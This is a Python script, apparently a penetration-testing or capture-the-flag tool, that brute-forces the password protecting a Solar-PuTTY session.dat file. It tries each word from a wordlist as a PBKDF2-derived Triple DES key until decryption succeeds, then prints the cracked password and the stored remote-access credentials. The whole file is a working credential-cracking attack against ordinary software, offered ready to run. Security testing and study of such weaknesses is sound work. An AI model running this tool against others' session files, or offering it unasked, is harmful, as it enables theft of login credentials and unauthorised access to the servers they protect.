import base64
import argparse
import json
from Cryptodome.Cipher import DES3
from Cryptodome.Protocol.KDF import PBKDF2

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key using PBKDF2
        key = PBKDF2(passphrase, salt, dkLen=24, count=1000)

        # Create the Triple DES cipher in CBC mode
        cipher = DES3.new(key, DES3.MODE_CBC, iv)

        # Decrypt the data
        decrypted_data = cipher.decrypt(encrypted_data)

        # Remove padding (PKCS7 padding)
        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        print(f'Error: {e}')

    return data

def main(args):
    try:
        with open(args.file) as f:
            cipher = f.read()
    except Exception as e:
        print(f'Error: {e}')

    try:
        with open(args.wordlist) as passwords:
            for i, password in enumerate(passwords):
                password = password.strip()
                decrypted = decrypt(password, cipher)
                if 'Credentials' in decrypted:
                    print(f"[+] Password cracked: {password}")
                    json_string = decrypted
                    parsed_json = json.loads(json_string)
                    pretty_json = json.dumps(parsed_json, indent=4)
                    print(f"[+] Credentials found in {args.file}: \n{pretty_json}")
                    break
    except Exception as e:
        print(f'Error: {e}')

if __name__=="__main__":
    parser = argparse.ArgumentParser(description = "Solar-PuTTY session.dat password bruteforcer")
    parser.add_argument("-f", "--file", help = "Solar-PuTTY session file (e.g. session.dat)", required=True)
    parser.add_argument("-w", "--wordlist", help = "Path to wordlist", required=True)
    args = parser.parse_args()

    main(args)
